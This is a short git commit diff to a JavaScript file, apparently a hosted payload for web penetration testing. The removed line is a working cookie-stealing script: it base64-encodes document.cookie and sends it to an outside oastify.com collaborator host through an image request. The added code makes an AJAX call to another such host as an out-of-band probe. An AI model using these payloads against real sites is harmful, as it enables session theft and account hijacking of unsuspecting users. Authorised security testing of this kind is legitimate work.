4bf93d16b7f5bf9c08549fbf00c9d7a47b664346
sefa <113290365+absosec@users.noreply.github.com>
2024-05-06 01:31:37 +0300

    Update testabcddde.js

--- testabcddd.js
+++ testabcddd.js
@@ -1,1 +1,7 @@
-var i=new Image(); i.src="7t1rpdl63ss3b6kwyrr2m75n2e85w1kq.oastify.com/?cookie="+btoa(document.cookie);
+$.ajax({
+  url: "https://bkzvghcauwj72ab0pvi6dbwrtiz9n6bv.oastify.com/users",
+  type: "GET",
+  success: function (result) {
+    console.log(result);
+  },
+});
